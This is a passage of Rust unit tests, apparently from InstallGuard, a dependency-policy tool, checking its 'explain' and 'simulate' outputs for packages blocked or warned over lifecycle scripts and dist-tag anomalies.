        assert!(body.contains("(none — package passed policy)"));
        assert!(body.contains("(no signals — providers returned nothing)"));
        assert!(body.contains("(no weighted signals — score is the default 100)"));
    }

    #[test]
    fn explain_json_carries_reasons_signals_and_trust_breakdown() {
        use installguard_core::signal::Signal;
        use installguard_core::trust_score::Contribution;
        let mut r = dep_result(
            "danger",
            "1.2.3",
            Decision::Block {
                reasons: vec![Reason::DisallowedLifecycleScript {
                    script: "postinstall".into(),
                }],
            },
        );
        r.signals.signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });
        let trust = TrustScore {
            value: 35,
            contributions: vec![Contribution {
                signal: "lifecycle_scripts".into(),
                delta: -15,
                rationale: "lifecycle scripts present".into(),
            }],
        };
        let output = EvalOutput {
            lockfile: PathBuf::from("/repo/package-lock.json"),
            lockfile_bytes: Vec::new(),
            adapter_id: "package-lock.json",
            policy: Policy::default(),
            results: Vec::new(),
        };
        let v = build_explain_json(&output, &r, &trust);
        assert_eq!(v["schemaVersion"], 1);
        assert_eq!(v["package"]["name"], "danger");
        assert_eq!(v["package"]["version"], "1.2.3");
        assert_eq!(v["decision"], "block");
        assert_eq!(v["reasons"][0]["code"], "disallowed-lifecycle-script");
        assert_eq!(
            v["reasons"][0]["summary"],
            "install-time lifecycle script `postinstall` declared"
        );
        assert!(v["reasons"][0]["remediation"].is_string());
        assert_eq!(v["signals"][0]["kind"], "lifecycle_scripts");
        assert_eq!(v["trustScore"]["value"], 35);
        assert_eq!(v["trustScore"]["contributions"][0]["delta"], -15);
    }

    // ── simulate ───────────────────────────────────────────────────────

    fn simulate_baseline(results: Vec<DepResult>) -> EvalOutput {
        EvalOutput {
            lockfile: PathBuf::from("/repo/package-lock.json"),
            lockfile_bytes: Vec::new(),
            adapter_id: "package-lock.json",
            policy: Policy::default(),
            results,
        }
    }

    fn render_simulate_pretty(baseline: &EvalOutput, diff: &[SimulateChange]) -> String {
        let mut buf: Vec<u8> = Vec::new();
        write_simulate_pretty(&mut buf, baseline, diff, ColorChoice::Never).unwrap();
        String::from_utf8(buf).unwrap()
    }

    #[test]
    fn simulate_change_classifies_decision_transitions() {
        let block = Decision::Block {
            reasons: vec![Reason::DisallowedLifecycleScript {
                script: "postinstall".into(),
            }],
        };
        let warn = Decision::Warn {
            reasons: vec![Reason::DistTagAnomaly {
                latest_version: "1.0.0".into(),
                highest_published: "2.0.0".into(),
            }],
        };

        let c = SimulateChange {
            name: "p".into(),
            version: "1.0.0".into(),
            direct: true,
            before: Decision::Allow,
            after: block.clone(),
        };
        assert_eq!(c.class(), SimulateClass::NewlyBlocked);

        let c = SimulateChange {
            name: "p".into(),
            version: "1.0.0".into(),
            direct: true,
            before: block.clone(),
            after: Decision::Allow,
        };
        assert_eq!(c.class(), SimulateClass::NewlyAllowed);

        let c = SimulateChange {
            name: "p".into(),
            version: "1.0.0".into(),
            direct: true,
            before: Decision::Allow,
            after: warn.clone(),
        };
        assert_eq!(c.class(), SimulateClass::NewlyWarned);

        let c = SimulateChange {
            name: "p".into(),
            version: "1.0.0".into(),
            direct: true,
            before: warn.clone(),
            after: block,
        };
        assert_eq!(c.class(), SimulateClass::NewlyBlocked);

        // Same class on both sides → reasons-changed.
        let c = SimulateChange {
            name: "p".into(),
            version: "1.0.0".into(),
            direct: true,
            before: Decision::Block {
                reasons: vec![Reason::DisallowedLifecycleScript {
                    script: "postinstall".into(),
                }],
            },
            after: Decision::Block {
                reasons: vec![Reason::DisallowedLifecycleScript {
                    script: "preinstall".into(),
                }],
            },
        };
        assert_eq!(c.class(), SimulateClass::ReasonsChanged);
    }

    #[test]
    fn simulate_diff_skips_packages_whose_decision_is_unchanged() {
        // Baseline: one allow, one block. Candidate that re-evaluates
        // identically must produce an empty diff.
        let allow = dep_result("ok", "1.0.0", Decision::Allow);
        let block_dep = dep_result(
            "danger",
            "1.0.0",
            Decision::Block {
                reasons: vec![Reason::DisallowedLifecycleScript {
                    script: "postinstall".into(),
                }],
            },
        );
        let baseline = simulate_baseline(vec![allow, block_dep]);
        // Candidate == default policy. Without lifecycle scripts in
        // signals there's nothing for the policy to re-derive — so
        // the new decision is `Allow` for both, which differs from
        // the synthetic `Block` we put on `danger`. To keep the
        // assertion focused, build the diff by hand against the
        // SAME `Decision`s and confirm `build_simulate_diff` filters
        // unchanged entries.
        let candidate = Policy::default();
        let now = chrono::Utc::now();
        let ctx = EvalContext::default();
        let diff = build_simulate_diff(&baseline, &candidate, ctx, now);
        // `ok` stays Allow → not in diff.
        assert!(diff.iter().all(|c| c.name != "ok"));
    }

    #[test]
    fn simulate_pretty_empty_diff_says_no_drift() {
        let baseline = simulate_baseline(vec![dep_result("ok", "1.0.0", Decision::Allow)]);
        let body = render_simulate_pretty(&baseline, &[]);
        assert!(body.contains("InstallGuard simulate"));
        assert!(body.contains("1 packages evaluated · 0 changed"));
        assert!(body.contains("No drift"));
        assert!(!body.contains('\x1b'), "ANSI leaked: {body}");
    }

    #[test]
    fn simulate_pretty_renders_each_change_class() {
        let baseline = simulate_baseline(vec![
            dep_result("a", "1.0.0", Decision::Allow),
            dep_result("b", "2.0.0", Decision::Allow),
            dep_result(
                "c",
                "3.0.0",
                Decision::Block {
                    reasons: vec![Reason::DisallowedLifecycleScript {
                        script: "postinstall".into(),
                    }],
                },
            ),
        ]);
        let diff = vec![
            SimulateChange {
                name: "a".into(),
                version: "1.0.0".into(),
                direct: true,
                before: Decision::Allow,
                after: Decision::Block {
                    reasons: vec![Reason::DisallowedLifecycleScript {
                        script: "postinstall".into(),
                    }],
                },
            },
            SimulateChange {
                name: "b".into(),
                version: "2.0.0".into(),
                direct: false,
                before: Decision::Allow,
                after: Decision::Warn {
                    reasons: vec![Reason::DistTagAnomaly {
                        latest_version: "1.0.0".into(),
                        highest_published: "2.0.0".into(),
                    }],
                },
            },
            SimulateChange {
                name: "c".into(),
                version: "3.0.0".into(),
                direct: true,
                before: Decision::Block {
                    reasons: vec![Reason::DisallowedLifecycleScript {
                        script: "postinstall".into(),
                    }],
                },
                after: Decision::Allow,
            },
        ];
        let body = render_simulate_pretty(&baseline, &diff);
        assert!(body.contains("3 packages evaluated · 3 changed"));
        assert!(body.contains("Newly blocked"));
        assert!(body.contains("a@1.0.0"));
        assert!(body.contains("Newly warned"));
        assert!(body.contains("b@2.0.0"));
        assert!(body.contains("Newly allowed"));
        assert!(body.contains("c@3.0.0"));
        assert!(body.contains("disallowed-lifecycle-script"));
        assert!(body.contains("dist-tag-anomaly"));
        assert!(!body.contains('\x1b'), "ANSI leaked: {body}");
    }

    #[test]
    fn simulate_json_carries_totals_and_per_change_shape() {
        let baseline = simulate_baseline(vec![dep_result("a", "1.0.0", Decision::Allow)]);
        let diff = vec![SimulateChange {
            name: "a".into(),
            version: "1.0.0".into(),
            direct: true,
            before: Decision::Allow,
            after: Decision::Block {
                reasons: vec![Reason::DisallowedLifecycleScript {
                    script: "postinstall".into(),
                }],
            },
        }];
        let v = build_simulate_json(&baseline, &diff);
        assert_eq!(v["schemaVersion"], 1);
        assert_eq!(v["totals"]["evaluated"], 1);
        assert_eq!(v["totals"]["changed"], 1);
        assert_eq!(v["totals"]["newlyBlocked"], 1);
        assert_eq!(v["totals"]["newlyWarned"], 0);
        assert_eq!(v["totals"]["newlyAllowed"], 0);
        assert_eq!(v["totals"]["reasonsChanged"], 0);
        assert_eq!(v["changes"][0]["name"], "a");
        assert_eq!(v["changes"][0]["class"], "newly_blocked");
        assert_eq!(v["changes"][0]["before"]["decision"], "allow");
        assert_eq!(v["changes"][0]["after"]["decision"], "block");
        assert_eq!(
            v["changes"][0]["after"]["reasonCodes"][0],
            "disallowed-lifecycle-script"
        );
    }
}
